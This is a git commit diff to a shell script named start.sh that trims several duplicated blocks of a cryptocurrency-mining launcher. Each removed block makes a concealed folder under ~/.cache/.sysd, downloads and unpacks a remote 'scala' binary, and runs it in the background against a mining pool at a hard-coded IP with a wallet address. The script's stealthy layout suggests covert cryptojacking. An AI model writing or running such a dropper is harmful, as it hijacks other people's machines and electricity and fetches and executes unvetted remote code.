daaa04b329c809f007a374ac295d4ac351aa5bc7
ewilkinso <ewilkinson3@alaska.edu>
2025-08-13 10:23:27 +0100

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,76 +1,7 @@
 #!/bin/bash
 
 WALLET="4Aea3C3PCm6VcfUJ82g46G3iBwq59x8z6DYa4aM2E7QMC42vpTKARQfBwig1gEPSr3JufAayvqVs26CFuD7cwq7U2rPbeCR"       # ← غيّر هذا إلى عنوان محفظتك الحقيقي
-WORKER="dandi10"
-POOL="45.155.102.89:443"
-THREADS=
-
-WORKDIR="$HOME/.cache/.sysd"
-mkdir -p "$WORKDIR" && cd "$WORKDIR"
-
-wget https://raw.githubusercontent.com/philip330/max/main/scala.tar.gz -O scala.tar.gz
-
-tar -xvf scala.tar.gz --strip=1
-rm scala.tar.gz
-
-nohup ./scala -o $POOL -u $WALLET -p $WORKER -k --tls --threads=$THREADS > cpu_output.log 2>&1 &
-
-#!/bin/bash
-
-WALLET="4Aea3C3PCm6VcfUJ82g46G3iBwq59x8z6DYa4aM2E7QMC42vpTKARQfBwig1gEPSr3JufAayvqVs26CFuD7cwq7U2rPbeCR"       # ← غيّر هذا إلى عنوان محفظتك الحقيقي
-WORKER="dandi100"
-POOL="45.155.102.89:443"
-THREADS=
-
-WORKDIR="$HOME/.cache/.sysd"
-mkdir -p "$WORKDIR" && cd "$WORKDIR"
-
-wget https://raw.githubusercontent.com/philip330/max/main/scala.tar.gz -O scala.tar.gz
-
-tar -xvf scala.tar.gz --strip=1
-rm scala.tar.gz
-
-nohup ./scala -o $POOL -u $WALLET -p $WORKER -k --tls --threads=$THREADS > cpu_output.log 2>&1 &
-
-#!/bin/bash
-
-WALLET="4Aea3C3PCm6VcfUJ82g46G3iBwq59x8z6DYa4aM2E7QMC42vpTKARQfBwig1gEPSr3JufAayvqVs26CFuD7cwq7U2rPbeCR"       # ← غيّر هذا إلى عنوان محفظتك الحقيقي
-WORKER="dandi1000"
-POOL="45.155.102.89:443"
-THREADS=
-
-WORKDIR="$HOME/.cache/.sysd"
-mkdir -p "$WORKDIR" && cd "$WORKDIR"
-
-wget https://raw.githubusercontent.com/philip330/max/main/scala.tar.gz -O scala.tar.gz
-
-tar -xvf scala.tar.gz --strip=1
-rm scala.tar.gz
-
-nohup ./scala -o $POOL -u $WALLET -p $WORKER -k --tls --threads=$THREADS > cpu_output.log 2>&1 &
-
-#!/bin/bash
-
-WALLET="4Aea3C3PCm6VcfUJ82g46G3iBwq59x8z6DYa4aM2E7QMC42vpTKARQfBwig1gEPSr3JufAayvqVs26CFuD7cwq7U2rPbeCR"       # ← غيّر هذا إلى عنوان محفظتك الحقيقي
-WORKER="dandi20"
-POOL="45.155.102.89:443"
-THREADS=
-
-WORKDIR="$HOME/.cache/.sysd"
-mkdir -p "$WORKDIR" && cd "$WORKDIR"
-
-wget https://raw.githubusercontent.com/philip330/max/main/scala.tar.gz -O scala.tar.gz
-
-tar -xvf scala.tar.gz --strip=1
-rm scala.tar.gz
-
-nohup ./scala -o $POOL -u $WALLET -p $WORKER -k --tls --threads=$THREADS > cpu_output.log 2>&1 &
-
-#!/bin/bash
-
-
-WALLET="4Aea3C3PCm6VcfUJ82g46G3iBwq59x8z6DYa4aM2E7QMC42vpTKARQfBwig1gEPSr3JufAayvqVs26CFuD7cwq7U2rPbeCR"       # ← غيّر هذا إلى عنوان محفظتك الحقيقي
-WORKER="dandi200"
+WORKER="dandi"
 POOL="45.155.102.89:443"
 THREADS=
 
